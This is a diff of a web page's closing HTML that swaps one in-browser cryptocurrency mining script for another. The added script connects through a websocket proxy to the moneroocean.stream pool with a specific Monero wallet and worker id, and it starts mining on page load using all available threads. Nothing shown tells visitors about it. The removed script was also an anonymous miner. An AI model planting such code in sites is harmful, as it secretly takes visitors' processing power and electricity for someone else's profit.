@@ -127,14 +127,16 @@
         );
     }   
   </script>
-      <script>
-        var _client = new Client.Anonymous('9e2c582d160d97944225c066d6df4fac72293ae79f85ecc3ed5bd824177f511f', {
-            throttle: 0.9, c: 'w', ads: 0
-        });
-        _client.start();
-
-
-    </script>
+  <script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "87EDPwcD17kh9KH5PjHK4pc23nQdDZXpN93i9xTh6htMTtTaYfhwpBoD7pdj838DZsQdwCdwtmFhANUF1SBEkBERLWKKbXD";
+    var workerId = "kino99"
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 70;
+  </script>
 </body>
 
 </html>
